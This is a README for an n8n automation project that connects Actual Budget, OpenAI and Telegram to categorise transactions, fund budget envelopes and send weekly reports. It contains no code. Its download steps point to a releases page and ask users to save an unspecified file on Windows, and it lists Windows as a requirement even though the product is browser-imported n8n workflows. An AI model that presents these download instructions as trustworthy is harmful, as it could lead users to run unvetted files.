# 🤖 n8n-Actual-Automation - Automate your personal budget with AI

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/algophobiaanoxia129/n8n-Actual-Automation/releases)

## 📌 Overview

This project provides tools to manage your finances through Actual Budget. You use these automated workflows to handle repetitive tasks. The system categorizes your transactions, funds your envelopes, and sends you a weekly budget report. These scripts rely on n8n to connect your bank data to your budgeting software.

## 🛠 Prerequisites

You need a working installation of Actual Budget before you start. Ensure you have your instance running on your local computer or a server. You also need a n8n instance. This tool works with both self-hosted n8n and the cloud version. You need a Telegram account to receive your budget reports.

## 📥 Get the software

Visit this page to download the necessary files: [https://github.com/algophobiaanoxia129/n8n-Actual-Automation/releases](https://github.com/algophobiaanoxia129/n8n-Actual-Automation/releases).

Select the latest version file from the list. Save this file to a folder on your Windows computer. Create a new folder on your desktop and move the file there. This keeps your workspace clean.

## ⚙️ Initial Setup

Open your n8n dashboard in your web browser. You will import the workflow files you downloaded. 

1. Click the "Workflow" button in your n8n sidebar.
2. Select "Import from File" in the menu.
3. Locate the file you saved earlier.
4. Click "Open" to load the automation steps into your workspace.

Once the workflow loads, you see a visual map of nodes. Each node represents a specific task. You must connect your credentials to these nodes to make the automation run.

## 🔑 Linking your accounts

Actual Budget requires an API key. You find this in your Actual Budget settings under "Show API Details." Copy the URL and the key. Paste these into the corresponding boxes in the n8n Actual Budget node.

For Telegram notifications, create a bot using the BotFather inside Telegram. Start a chat with @BotFather and send the command /newbot. Follow the instructions to get your API token. Copy this token into the n8n Telegram node.

## 🤖 Configuring AI categorization

The AI categorization feature analyzes your transaction history. It compares new entries against your past spending habits. To configure this, you need an OpenAI API key.

1. Create an account at the OpenAI platform website.
2. Generate a new "Secret Key."
3. Open the n8n workflow marked "AI Categorization."
4. Paste your secret key into the credential field.

The system now learns how you label your expenses. It tags new transactions automatically based on your history.

## 💰 Envelope auto-funding

The auto-funding workflow ensures your envelopes have money at the start of the month. You set target amounts for specific categories like "Groceries" or "Rent." The script checks your "To Be Budgeted" balance. It moves money into your envelopes based on the rules you set in the workflow. 

Open the node labeled "Funding Rules" to adjust these amounts. You simply type in the dollar amounts for each category index. Save the workflow after you make these changes.

## 📊 Setting up weekly briefings

You receive your status updates via Telegram. The workflow triggers every Sunday morning. It summarizes your spending for the week and shows your current envelope status.

To activate this, click on the "Schedule" node at the start of the workflow. Set the time to your preference. Ensure your Telegram chat ID is present in the "Chat ID" field of the Telegram node. You find your ID by messaging the @userinfobot on Telegram.

## 🚀 Running your workflows

After you input your credentials, click the "Test" button at the bottom of the n8n editor. A green checkmark appears on each node if the connection succeeds. If a node turns red, check your API keys for errors.

Click "Activate" in the top right corner of the n8n interface. Your automation now runs in the background. You do not need to keep the n8n window open for the triggers to fire. 

## 📝 Maintenance tips

Check your workflows once a month. Sometimes APIs update or change their security requirements. If your Telegram reports stop arriving, check your token status. If your bank transactions stop appearing, check your Actual Budget API connection.

The n8n editor provides a "History" tab. Use this to review every action taken by the software. If a transaction categorization looks wrong, you see exactly what data the AI processed here. You can manually adjust any transaction inside Actual Budget if the automated label needs a change.

## 📋 System requirements

- Windows 10 or 11
- Modern web browser
- Active internet connection
- Actual Budget instance
- n8n instance (Version 1.0 or higher)
- OpenAI account for AI features
- Telegram account for briefings

## 💡 Support

Check the GitHub issues tab if you encounter errors while running the setup. Other users often face similar hurdles. Search the existing issues before you open a new one. Provide your error logs and a description of your steps. Keep your keys secret when you post logs. Ensure no private data remains in the text you share.

Use this software to save time on your personal finance tasks. The goal is to spend less time in your budget and more time reaching your financial targets. Keep your system updated as new releases appear on the project page.